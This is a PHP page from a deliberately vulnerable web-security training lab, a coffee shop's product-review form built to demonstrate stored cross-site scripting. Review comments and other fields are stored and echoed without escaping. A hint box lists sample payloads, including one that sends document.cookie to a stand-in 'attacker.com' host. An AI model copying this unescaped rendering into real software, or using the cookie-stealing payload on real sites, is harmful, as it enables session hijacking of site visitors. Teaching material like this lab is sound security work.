<?php
/**
 * ══════════════════════════════════════════════════
 * VULNERABILITY #5: Stored XSS
 * Lab: Product Reviews
 *
 * Vuln: User-submitted review comments are stored in DB
 *       and rendered without HTML escaping → stored XSS.
 * ══════════════════════════════════════════════════
 */

include '/var/www/html/includes/db.php';

$message = '';
$type    = '';

// Handle review submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $product_id = intval($_POST['product_id'] ?? 1);
    $username   = $_POST['username']  ?? 'Anonymous';
    $comment    = $_POST['comment']   ?? '';      // ⚠️ NOT sanitised before storing
    $rating     = intval($_POST['rating'] ?? 5);

    if (!empty($comment)) {
        $conn = get_db();
        // ⚠️  STORED XSS — comment stored raw, no sanitisation
        $stmt = $conn->prepare("INSERT INTO reviews (product_id, user_id, username, comment, rating) VALUES (?, 1, ?, ?, ?)");
        $stmt->bind_param('issi', $product_id, $username, $comment, $rating);
        $stmt->execute();
        $stmt->close();
        $conn->close();
        $message = "✅ Review submitted successfully!";
        $type    = 'success';
    }
}

// Fetch products for dropdown
$conn     = get_db();
$products = $conn->query("SELECT id, name FROM products ORDER BY name")->fetch_all(MYSQLI_ASSOC);

// Fetch reviews
$pid_filter = intval($_GET['product'] ?? 0);
$sql_reviews = $pid_filter
    ? "SELECT r.*, p.name as product_name FROM reviews r JOIN products p ON r.product_id=p.id WHERE r.product_id=$pid_filter ORDER BY r.created_at DESC"
    : "SELECT r.*, p.name as product_name FROM reviews r JOIN products p ON r.product_id=p.id ORDER BY r.created_at DESC";

$reviews = $conn->query($sql_reviews)->fetch_all(MYSQLI_ASSOC);
$conn->close();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Customer Reviews | Breuta Coffee</title>
<link rel="stylesheet" href="/assets/css/style.css">
</head>
<body>
<?php include '/var/www/html/includes/navbar.php'; ?>

<div class="page-header">
  <div class="container">
    <h1>🧨 Stored XSS – Customer Reviews</h1>
    <p>Share your coffee experience! (All feedback welcome...)</p>
  </div>
</div>

<div class="container">

  <div class="vuln-hint">
    <h4>🧑‍🎓 Lab Exercise: Stored Cross-Site Scripting</h4>
    <p>Review comments are stored in the database and rendered directly into the HTML without escaping.<br>
    Try submitting a review containing a JavaScript payload. Every visitor who views the reviews page will execute it.</p>
    <p style="margin-top:.5rem;"><strong>Payload examples:</strong></p>
    <code>&lt;script&gt;alert('XSS by '+document.domain)&lt;/script&gt;</code><br>
    <code>&lt;img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)"&gt;</code>
  </div>

  <?php if ($message): ?>
    <div class="alert alert-<?= $type ?>"><?= $message ?></div>
  <?php endif; ?>

  <!-- Review form -->
  <div class="card">
    <h2>Write a Review</h2>
    <form method="POST">
      <div class="form-group">
        <label>Product</label>
        <select name="product_id">
          <?php foreach ($products as $p): ?>
            <option value="<?= $p['id'] ?>"><?= htmlspecialchars($p['name']) ?></option>
          <?php endforeach; ?>
        </select>
      </div>
      <div class="form-group">
        <label>Your Name</label>
        <input type="text" name="username" placeholder="Your name" value="coffee_lover">
      </div>
      <div class="form-group">
        <label>Rating</label>
        <select name="rating">
          <option value="5">⭐⭐⭐⭐⭐</option>
          <option value="4">⭐⭐⭐⭐</option>
          <option value="3">⭐⭐⭐</option>
          <option value="2">⭐⭐</option>
          <option value="1">⭐</option>
        </select>
      </div>
      <div class="form-group">
        <label>Review Comment (HTML accepted 😈)</label>
        <textarea name="comment" rows="4" placeholder="Write your review here... or a payload..."></textarea>
      </div>
      <button type="submit">Submit Review</button>
    </form>
  </div>

  <!-- Filter -->
  <div class="card">
    <h2>Browse Reviews</h2>
    <form method="GET" style="display:flex; gap:1rem; align-items:flex-end;">
      <div class="form-group" style="flex:1; margin:0;">
        <label>Filter by Product</label>
        <select name="product">
          <option value="0">— All Products —</option>
          <?php foreach ($products as $p): ?>
            <option value="<?= $p['id'] ?>" <?= ($pid_filter == $p['id'] ? 'selected' : '') ?>>
              <?= htmlspecialchars($p['name']) ?>
            </option>
          <?php endforeach; ?>
        </select>
      </div>
      <button type="submit">Filter</button>
    </form>
  </div>

  <!-- Reviews list — INTENTIONALLY RENDERS RAW HTML (XSS) -->
  <?php if (empty($reviews)): ?>
    <div class="alert alert-info">No reviews yet. Be the first!</div>
  <?php else: ?>
    <?php foreach ($reviews as $r): ?>
      <div class="review-card">
        <div class="review-meta">
          <strong><?= $r['username'] ?></strong> ·
          <?= str_repeat('⭐', intval($r['rating'])) ?> ·
          <em><?= $r['product_name'] ?></em> ·
          <?= $r['created_at'] ?>
        </div>
        <!-- ⚠️  XSS: comment rendered raw — no htmlspecialchars() -->
        <div class="review-body"><?= $r['comment'] ?></div>
      </div>
    <?php endforeach; ?>
  <?php endif; ?>

</div>

<?php include '/var/www/html/includes/footer.php'; ?>
<script src="/assets/js/main.js"></script>
</body>
</html>
